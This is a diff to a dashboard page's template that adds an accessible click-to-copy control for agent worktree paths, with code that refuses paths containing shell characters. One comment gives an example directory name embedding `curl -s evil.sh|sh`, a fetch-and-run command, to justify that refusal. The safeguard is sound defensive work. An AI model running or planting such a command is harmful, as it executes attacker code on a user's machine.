@@ -42,7 +42,10 @@
       --border: #2a313c; --border-strong: #3a424e; --divider: #30363d;
       --text-1: #e6edf3; --text-2: #9aa7b4; --text-3: #7d8b9a; --text-invert: #0d1117;
       --brand: #d2814e; --brand-strong: #e0925f; --brand-soft: rgba(210, 129, 78, .16);
-      --focus-ring: rgba(210, 129, 78, .55);
+      /* Opaque, not the translucent brand: composited over a card surface a
+         translucent ring measured 2.61:1, under the 3:1 WCAG 1.4.11 asks of a
+         focus indicator. At full opacity it is 5.76:1 here. */
+      --focus-ring: var(--brand);
       --attention: #e8a13c; --attention-bg: rgba(232, 161, 60, .13);
       --background: #5b9bd5; --working: #3fb950; --idle: #7d8590;
       --ok: #3fb950; --fail: #f85149; --fail-bg: rgba(248, 81, 73, .13);
@@ -55,7 +58,7 @@
       --border: #d8dee4; --border-strong: #c2cad2; --divider: #c8d1da;
       --text-1: #1f2328; --text-2: #59636e; --text-3: #6b7480; --text-invert: #ffffff;
       --brand: #b65a26; --brand-strong: #9d4a1c; --brand-soft: rgba(182, 90, 38, .10);
-      --focus-ring: rgba(182, 90, 38, .45);
+      --focus-ring: var(--brand); /* 1.88:1 translucent -> 4.69:1 opaque; see :root */
       --attention: #b35900; --attention-bg: rgba(179, 89, 0, .10);
       --background: #3a6ea5; --working: #1a7f37; --idle: #818b98;
       --ok: #1a7f37; --fail: #cf222e; --fail-bg: rgba(207, 34, 46, .08);
@@ -214,6 +217,80 @@
        getting cut off — or hogging the row. */
     td.branch { white-space: normal; word-break: break-word; }
     td.branch .rebase-branch { font-style: italic; } /* a branch recovered mid-rebase, not a steady-state checkout */
+    /* The roster's branch cell doubles as a click-to-copy control for the
+       session's worktree path (see branchcellroster). The button is reset to
+       plain text, and the ⧉ is transparent until hover or focus (see .copyicon
+       below), so at rest the column reads exactly as it did before. Since the
+       button — not the <td> — is now the box the text flows in, the "wrap, never
+       ellipse" rule above has to be restated on it.
+       user-select is part of that reset, not an extra: UA stylesheets make
+       buttons unselectable, and the branch name was drag-selectable text before
+       it was wrapped in one. The click handler skips a click that ends a
+       selection so the two gestures don't fight. */
+    td.branch .copycwd {
+      appearance: none; -webkit-appearance: none;
+      background: none; border: 0; padding: 0; margin: 0;
+      font: inherit; color: inherit; text-align: left; cursor: pointer;
+      max-width: 100%; white-space: normal; word-break: break-word;
+      -webkit-user-select: text; user-select: text;
+    }
+    /* On a touch screen the one-line cell is a ~20px target, well under the 44px
+       guidance. Pad the hit area and pull the same amount back in with a negative
+       margin so the row's metrics — and the desktop layout, which never sees this
+       block — are unchanged. How much this buys depends on the layout: in the
+       scrolling-table layout (>640px, which includes tablets in landscape) the
+       `th, td { overflow: hidden }` rule above clips the hit-test region back to
+       the cell box, so padding beyond the row's own vertical budget is not
+       clickable — it is capped at roughly the row height, not 44px. Removing the
+       clipping is not the fix; it is what keeps an enlarged button from
+       overlapping the adjacent row's. So the padding stays inside that budget,
+       and the full target is only realised at <=640px, where the card layout
+       resets td to overflow: visible. */
+    @media (pointer: coarse) {
+      td.branch .copycwd { padding: 6px 8px; margin: -6px -8px; }
+    }
+    /* The glyph is transparent at rest rather than absent: one ⧉ per roster row
+       is a column of noise, but the span stays in the flow at all times — never
+       display:none, never removed — so revealing it cannot reflow the branch name
+       beside it. Hover is scoped to the row, not the button, so crossing anywhere
+       on the row surfaces the affordance.
+       The three forced-visible states are not decoration. focus-visible is how a
+       keyboard user finds the control at all, and the two flash classes have to
+       outrank hover because that is the one moment the icon MUST be seen: a
+       keyboard copy never hovers, and a mouse copy is often followed by the
+       pointer leaving the row well inside the 1.2s window. Dropping either would
+       leave the copy silently unconfirmed. */
+    .copyicon {
+      color: var(--text-3); font-size: .85em; margin-left: .4em;
+      opacity: 0;
+      transition: color var(--dur-fast) var(--ease), opacity var(--dur-fast) var(--ease);
+    }
+    tr:hover .copyicon,
+    .copycwd:focus-visible .copyicon,
+    .copycwd.copied .copyicon,
+    .copycwd.copyfail .copyicon { opacity: 1; }
+    /* Touch has no hover to reveal on, so there the glyph is the only thing
+       marking the cell as a control — it stays visible. Companion to the
+       (pointer: coarse) hit-area block above. */
+    @media (hover: none) {
+      .copyicon { opacity: 1; }
+    }
+    .copycwd:hover .copyicon { color: var(--text-1); }
+    .copycwd:focus-visible .copyicon { color: var(--brand); }
+    .copycwd.copied .copyicon { color: var(--ok); }
+    /* A failed copy needs a visible state too, not just the live region: the
+       clipboard silently keeps its old contents, so a sighted user who sees
+       nothing happen would paste the wrong path. */
+    .copycwd.copyfail .copyicon { color: var(--fail); }
+
+    /* Visually hidden but still announced — the copy confirmation and the
+       cluster suffix live here. clip-path is the modern rule; the deprecated
+       clip stays for browsers that only honour it. */
+    .ck-sr {
+      position: absolute; width: 1px; height: 1px; padding: 0; margin: -1px;
+      overflow: hidden; clip: rect(0 0 0 0); clip-path: inset(50%);
+      white-space: nowrap; border: 0;
+    }
     .type { font-weight: 600; color: var(--text-2); }
     td.count { font-variant-numeric: tabular-nums; color: var(--text-1); font-weight: 600; }
 
@@ -408,6 +485,11 @@
 
   <main id="content" aria-live="polite" aria-atomic="false">{{ template "content" . }}</main>
 
+  <!-- Copy confirmations announce here. It lives OUTSIDE #content because the
+       poller replaces that element's innerHTML wholesale, which would wipe a
+       live region mid-announcement. -->
+  <div id="ck-copystatus" class="ck-sr" role="status" aria-live="polite"></div>
+
   <footer class="ck-footer">
     clodhopper · read-only · <span class="host" id="ck-host">127.0.0.1:4555</span> — best-effort, like everything else here.
   </footer>
@@ -438,6 +520,42 @@
       }
     }
 
+    // Replacing #content wholesale detaches everything inside it. That was free
+    // until the roster grew a focusable control: a keyboard user who has tabbed
+    // to a copy button loses focus to <body> on the next signature change (WCAG
+    // 2.4.3), and a button mid-flash is replaced by a fresh one showing nothing.
+    // So carry focus across the swap by the button's stable data-session key,
+    // and tell the copy handler to let go of any flash it is holding on a node
+    // that is about to be detached.
+    //
+    // The key is the session id, not the path: the roster is keyed by session,
+    // so the several agents sharing one worktree — the cluster this board exists
+    // to show — all render the SAME data-cwd, and a path match would land focus
+    // on whichever of them sorted first. Row order inside a cluster is not even
+    // stable between polls (the tie-break is idle seconds), so that would move
+    // the keyboard user around at random. A row with no session id has no stable
+    // key, so it simply gets no restoration rather than a guess.
+    //
+    // The matching button is found by scanning rather than by building a
+    // selector: CSS.escape — the only correct way to quote an interpolated value
+    // — is absent on older engines. A roster is a handful of rows; the scan is
+    // free. focus() is passed preventScroll because rows genuinely move between
+    // polls (freshest group first), and restoring focus must not yank the
+    // viewport of a sighted keyboard user who did not scroll. Engines that
+    // predate the options object ignore it rather than throw.
+    function swapContent(html) {
+      var active = document.activeElement;
+      var keep = active && active.closest ? active.closest('#content .copycwd') : null;
+      var key = keep ? keep.getAttribute('data-session') : null;
+      try { document.dispatchEvent(new CustomEvent('ch:contentswap')); } catch (e) {}
+      document.getElementById('content').innerHTML = html;
+      if (!key) return;
+      var btns = document.querySelectorAll('#content .copycwd');
+      for (var i = 0; i < btns.length; i++) {
+        if (btns[i].getAttribute('data-session') === key) { btns[i].focus({ preventScroll: true }); return; }
+      }
+    }
+
     if (refresh > 0) {
       // Idle is shown in minutes once past 60s, so a 30s cadence keeps the
       // displayed value within ~30s of true without per-second churn.
@@ -448,7 +566,7 @@
           .then(function (d) {
             if (d.signature !== sig) {
               sig = d.signature;
-              document.getElementById('content').innerHTML = d.html;
+              swapContent(d.html);
               tickIdle();
             }
           })
@@ -509,6 +627,202 @@
     });
   })();
 
+  // Click-to-copy for the roster's worktree paths.
+  //
+  // Two structural constraints, both of which fail SILENTLY if refactored away:
+  //   1. The listener is DELEGATED from document. The poller swaps #content
+  //      wholesale, so per-button listeners bound in a loop would be discarded
+  //      on the first repaint and every click after it would do nothing.
+  //   2. The #ck-copystatus live region must stay OUTSIDE #content. A live
+  //      region re-created by that swap is a NEW region to assistive tech, and
+  //      text present when a region appears is not announced.
+  //
+  // navigator.clipboard is absent on a plain-HTTP origin (serve --tailscale is
+  // not a secure context), so an execCommand fallback carries those hosts; unlike
+  // the network calls here, a copy that quietly no-ops is a bug, so a failure
+  // gets both an announcement and a visible ✗.
+  (function () {
+    var live = document.getElementById('ck-copystatus');
+    var flashed = null; // the one button currently showing a transient state
+    var timer = null;
+    var liveTimer = null; // pending delayed set, so a second call can cancel it
+
+    // Clear, then set on a later tick: a live region whose text is unchanged may
+    // not be re-announced, and copying the same path twice must still speak.
+    // Two calls inside that window would otherwise both clear before either set
+    // ran, leaving the same text set twice with no clear between — precisely the
+    // non-announcement the clear exists to prevent. So the pending set is
+    // cancelled first, the same way unflash owns the flash timeout.
+    function announce(msg) {
+      if (!live) return;
+      if (liveTimer) { clearTimeout(liveTimer); liveTimer = null; }
+      live.textContent = '';
+      liveTimer = setTimeout(function () { liveTimer = null; live.textContent = msg; }, 60);
+    }
+
+    // The single owner of the revert, shared by the timeout and the pre-empt
+    // path so they cannot drift. Only one button may hold the flash: copying row
+    // B within the window used to leave row A stranded with a ✓ it no longer
+    // deserved (and with ?refresh=0, forever).
+    function unflash() {
+      if (timer) { clearTimeout(timer); timer = null; }
+      if (!flashed) return;
+      var icon = flashed.querySelector('.copyicon');
+      flashed.classList.remove('copied');
+      flashed.classList.remove('copyfail');
+      if (icon) icon.textContent = '⧉';
+      flashed = null;
+    }
+
+    function flash(btn, ok, msg) {
+      unflash();
+      var icon = btn.querySelector('.copyicon');
+      btn.classList.add(ok ? 'copied' : 'copyfail');
+      if (icon) icon.textContent = ok ? '✓' : '✗';
+      announce(msg);
+      flashed = btn;
+      timer = setTimeout(unflash, 1200);
+    }
+
+    // Defence in depth for rows stored before ingest started stripping these:
+    // html/template does not escape a newline in an attribute value and the
+    // parser hands it back intact, so a crafted cwd could put a newline-
+    // terminated shell command on the clipboard of someone about to paste into
+    // a terminal. A real path contains no control characters, so one in the
+    // stored value means REFUSE, not repair: deleting it would leave a
+    // plausible-looking path that is not the one on disk, and handing THAT over
+    // silently is worse than handing over nothing. Tested against the raw
+    // attribute value, before anything else looks at it.
+    //
+    // It cannot be left to pathAllow below: that pattern's ES5 fallback permits
+    // every code point above U+007F, which includes the C1 controls.
+    var ctrlChars = /[\u0000-\u001F\u007F-\u009F]/;
+
+    // The allowlist a path must satisfy before it may reach the clipboard. It
+    // matches the FIRST character that is NOT allowed, so a match means refuse.
+    //
+    // An allowlist, not a denylist, mirroring the scrub layer's fail-closed
+    // bias: this button exists so you do not have to read the path, so nothing
+    // that could act when pasted after `cd ` may ride along. A directory named
+    // `proj$(curl -s evil.sh|sh)` takes no code execution to create — an
+    // unpacked archive or a package postinstall will do — and $, `, ;, |, &,
+    // (, ), <, > are all legal in a POSIX name and none is a control character,
+    // so stripping control characters at ingest does not touch them.
+    //
+    // Permitted: Unicode letters, marks and digits, so accented and CJK
+    // directory names copy normally; the space, because ~/Library/Application
+    // Support is ordinary and entirely safe to paste; and the punctuation real
+    // paths are built from: - / . _ + = , : @ ~ %. Everything else refuses.
+    //
+    // NEVER add \p{S} here to make emoji directory names copy. The class is
+    // NEGATED, so a category added to it WIDENS what is permitted, and \p{S}
+    // contains $ + < = > | ~ ^ and the backtick — it would re-admit command
+    // substitution wholesale. The explicit punctuation list alongside it
+    // subtracts nothing. Emoji paths staying refused is the correct trade.
+    var pathAllow;
+    try {
+      pathAllow = new RegExp('[^-\\p{L}\\p{M}\\p{N} /._+=,:@~%]', 'u');
+    } catch (e) {
+      // An engine without Unicode property escapes (pre-2018). Permit every
+      // non-ASCII code point rather than enumerate the letter categories: no
+      // shell-active character lives above U+007F, so every character the
+      // refusal exists for is still refused.
+      pathAllow = new RegExp('[^-A-Za-z0-9 /._+=,:@~%\\u0080-\\uFFFF]');
+    }
+
+    // Why this stored cwd is unfit to copy, or null if it is fine. Three
+    // distinct causes, so three distinct messages: telling someone their path
+    // held a secret when it was merely too long is its own small lie.
+    //
+    // 'redacted'  — the scrub layer fails closed, so a genuine segment shaped
+    //   like a credential (…/api-key=v1/…) comes back as «redacted».
+    // 'truncated' — the value hit the length cap and came back with a trailing
+    //   …. Reachable mainly through rows written before cwd got its own
+    //   PATH_MAX-sized cap; new writes are bounded below it (see maxPathLen in
+    //   scrub.go).
+    // 'unsafe'    — see pathAllow above. The click handler raises this one
+    //   itself for a control character (see ctrlChars), which pathAllow's ES5
+    //   fallback would otherwise let through above U+007F.
+    //
+    // The first two name a directory that does not exist; the third names one
+    // that may do something. Either way, refuse and say which, rather than hand
+    // over a path whose problem only shows up once it has been pasted.
+    function unusableReason(s) {
+      if (s.indexOf('«redacted»') !== -1) return 'redacted';
+      if (s.charAt(s.length - 1) === '…') return 'truncated';
+      if (pathAllow.test(s)) return 'unsafe';
+      return null;
+    }
+    var unusableMsg = {
+      redacted: 'part of this path was redacted — not copied',
+      truncated: 'this path was too long and got cut off — not copied',
+      unsafe: 'this path contains shell characters — not copied'
+    };
+
+    // Pre-secure-context fallback: select an off-screen textarea and let the
+    // document copy command take it.
+    function legacyCopy(text) {
+      var ok = false, ta = null, prev = document.activeElement;
+      try {
+        ta = document.createElement('textarea');
+        ta.value = text;
+        ta.setAttribute('readonly', '');
+        ta.style.position = 'fixed';
+        ta.style.top = '-1000px';
+        ta.style.opacity = '0';
+        document.body.appendChild(ta);
+        ta.select();
+        ok = document.execCommand('copy');
+      } catch (e) { ok = false; }
+      if (ta && ta.parentNode) ta.parentNode.removeChild(ta);
+      // select() moved focus into the textarea; removing it drops focus to
+      // <body>, which would strand the keyboard user who triggered this — the
+      // very user this fallback exists for.
+      if (prev && prev.focus) { try { prev.focus(); } catch (e) {} }
+      return ok;
+    }
+
+    // The poller replaces #content wholesale, so a button holding the flash can
+    // be detached mid-window. Let go of it there rather than let the timeout
+    // fire against a node that is no longer in the document.
+    document.addEventListener('ch:contentswap', unflash);
+
+    document.addEventListener('click', function (ev) {
+      var btn = ev.target && ev.target.closest ? ev.target.closest('.copycwd') : null;
+      if (!btn) return;
+      // A click that ends a drag-selection of the branch name is not a copy
+      // request; the button is selectable text first, a control second. Scoped
+      // to mouse activation (detail 0 means keyboard) and to a selection that
+      // actually covers THIS button: pressing Enter on a focused button does not
+      // collapse a selection made earlier elsewhere on the page, so a
+      // document-wide guard would silently no-op the copy — no flash, no
+      // announcement — for exactly the keyboard and screen-reader users the
+      // button, its aria-label and the live region were added for.
+      if (ev.detail !== 0) {
+        try {
+          var sel = window.getSelection();
+          if (sel && String(sel) && sel.containsNode && sel.containsNode(btn, true)) return;
+        } catch (e) {}
+      }
+      var path = btn.getAttribute('data-cwd') || '';
+      if (!path) return;
+      var why = ctrlChars.test(path) ? 'unsafe' : unusableReason(path);
+      if (why) {
+        flash(btn, false, unusableMsg[why]);
+        return;
+      }
+      function done(ok) { flash(btn, ok, (ok ? 'copied ' : 'could not copy ') + path); }
+      if (navigator.clipboard && navigator.clipboard.writeText) {
+        navigator.clipboard.writeText(path).then(
+          function () { done(true); },
+          function () { done(legacyCopy(path)); }
+        );
+      } else {
+        done(legacyCopy(path));
+      }
+    });
+  })();
+
   // Reflect the actual bind address in the footer rather than a hard-coded port.
   (function () { var h = document.getElementById('ck-host'); if (h) h.textContent = location.host; })();
   </script>
@@ -530,13 +844,33 @@
      tables. */}}
 {{ define "branchcell" }}<td class="branch" data-label="branch">{{ template "branchinner" . }}</td>{{ end }}
 
-{{/* branchcellroster is the roster's branch <td>. It adds a screen-reader-only
-     "(cluster)" suffix on grouped rows so the multi-session binding conveyed
+{{/* branchcellroster is the roster's branch <td>. Grouped rows carry a
+     screen-reader-only "(cluster)" note so the multi-session binding conveyed
      visually by the left accent bar (the .grouped CSS) is also announced to
      assistive tech, which cannot perceive the bar. Singleton branches (.Grouped
-     false) carry no aria-label and read exactly as before. Roster-only because
-     only Agent exposes .Grouped. */}}
-{{ define "branchcellroster" }}<td class="branch" data-label="branch"{{ if .Grouped }} aria-label="{{ if .Branch }}{{ .Branch }}{{ else }}—{{ end }}{{ if .Rebasing }} (mid-rebase, cluster){{ else }} (cluster){{ end }}"{{ end }}>{{ template "branchinner" . }}</td>{{ end }}
+     false) get no note and read exactly as before. Roster-only because only
+     Agent exposes .Grouped.
+
+     The branch name also becomes a click-to-copy control for the session's
+     worktree path: that path is what you actually need to get to the agent
+     (cd there, open an editor), and it is the one field the board knows but
+     never showed. A real <button> so it is focusable and announced; its
+     aria-label repeats the branch (and mid-rebase state) because a button's
+     label replaces its inner text, and someone who tabs straight to it would
+     otherwise hear only "copy worktree path". Rows with no cwd — the only ones
+     where there is nothing to copy — render exactly as before.
+
+     Where "(cluster)" lands depends on that button, and it must land in exactly
+     one place. A button's own aria-label REPLACES its accessible name entirely,
+     so a sibling .ck-sr span is invisible to anyone tabbing control-to-control
+     (focus mode) even though a browse-mode reader would read it. So when there
+     is a button the note is folded INTO its aria-label, exactly as
+     "(mid-rebase)" already is, and the sibling span is not emitted — emitting
+     both would have browse mode announce the cluster twice. Rows with no button
+     keep the span, which is the only carrier they have. Never an aria-label on
+     the <td>: a cell supports name-from-author, so a label there would REPLACE
+     the cell's contents for assistive tech instead of composing with them. */}}
+{{ define "branchcellroster" }}<td class="branch" data-label="branch">{{ if .Cwd }}<button type="button" class="copycwd" data-session="{{ .SessionID }}" data-cwd="{{ .Cwd }}" title="{{ .Cwd }}" aria-label="{{ if .Branch }}{{ .Branch }}{{ else }}no branch{{ end }}{{ if .Rebasing }} (mid-rebase){{ end }}{{ if .Grouped }} (cluster){{ end }} — copy worktree path {{ .Cwd }}">{{ template "branchinner" . }}<span class="copyicon" aria-hidden="true">⧉</span></button>{{ else }}{{ template "branchinner" . }}{{ if .Grouped }}<span class="ck-sr"> (cluster)</span>{{ end }}{{ end }}</td>{{ end }}
 
 {{ define "content" }}
   <div class="ck-meta">
